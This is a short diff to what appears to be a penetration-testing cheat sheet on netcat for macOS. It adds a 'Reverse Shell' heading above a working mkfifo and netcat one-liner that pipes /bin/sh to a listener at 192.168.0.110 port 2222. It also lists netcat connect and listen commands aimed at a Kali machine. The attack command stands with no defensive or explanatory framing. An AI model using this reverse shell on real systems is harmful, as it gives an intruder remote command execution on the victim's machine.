@@ -10,6 +10,8 @@ MacOS:
 	nc KALI-IP 8888 (connect - cannot execute -e directly)
     nc -l 8888 (listen - cannot execute -e directly)
 
+## Reverse Shell
+
 Shell:
 
 	mkfifo /tmp/f; nc 192.168.0.110 2222 0</tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
